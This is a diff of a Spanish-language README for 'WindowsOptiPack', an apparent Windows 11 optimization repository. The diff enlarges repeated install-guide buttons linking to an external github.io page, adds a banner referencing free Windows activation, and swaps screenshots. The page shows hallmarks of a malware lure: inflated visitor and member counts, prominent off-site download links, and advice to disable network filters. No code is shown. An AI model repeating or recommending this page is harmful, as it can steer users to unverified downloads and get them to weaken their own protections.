@@ -2,12 +2,12 @@
 
 ![Visitantes: 200K+](https://img.shields.io/badge/Visitantes-200K+-e74c3c) ![Miembros: 160K+](https://img.shields.io/badge/Miembros-160K+-6c5ce7) ![Actualizado](https://img.shields.io/badge/Actualizado-blue)
 
-![WindowsOptiPack Banner]( )
+![WindowsOptiPack Banner](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXOJ3Z_xj5HX9YGqMcDngrhzawdl8vDTjQ9TQK2y4M_8tSqTPv766qzYc3VZk5FK4KQ0cGobM3MDfzRZHQ-7z7ZvVn6eS0r4pqrm059C9HAwr21PmUvJhVcOLzhRxR5XDk8BIxdxrqjFE/s1280/activate+windows+11+free+forever+sombex%25281%2529.png)
 
 **Acerca de WindowsOptiPack**: WindowsOptiPack es un repositorio para usuarios de *Windows 11 24H2* en Windows, con herramientas y configuraciones comunitarias para optimizar el sistema operativo. Mejora el rendimiento, reduce tiempos de carga y potencia flujos de trabajo cotidianos para una experiencia fluida. Con 200K+ visitantes y 160K+ miembros, ¡eleva tu productividad hoy!
 
  <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
 
 ---
@@ -23,8 +23,9 @@ Mejora tu *Windows 11 24H2* con **WindowsOptiPack** en Windows:
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
  <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
+
 
 ## 🛠 ¿Por qué WindowsOptiPack?
 
@@ -36,8 +37,9 @@ Mejora tu *Windows 11 24H2* con **WindowsOptiPack** en Windows:
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tu sistema.
 
  <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
+
 
 ## 💻 Escenarios de Optimización
 
@@ -77,14 +79,8 @@ Mejora tu *Windows 11 24H2* con **WindowsOptiPack** en Windows:
 ## 📸 Visuales
 
 **Interfaz de WindowsOptiPack**  
-![Interfaz](https://i.ytimg.com/vi/gt7WXqgs_SI/maxresdefault.jpg)  
-*Panel de optimización intuitivo.*
-
-**Características de las Herramientas**  
-![Características](https://avatars.mds.yandex.net/i?id=f66dab7a0b508fb67e7cfa815c4697cf_l-5477655-images-thumbs&ref=rim&n=13&w=1260&h=709)  
-*Herramientas optimizadas para Windows.*
-
----
+![Interfaz](https://msgang.com/wp-content/uploads/2023/10/KVMOD8duOKPRtRMoWF0vMtfLp.jpg)  
+ 
 
 ## 🌐 Lenguajes
 
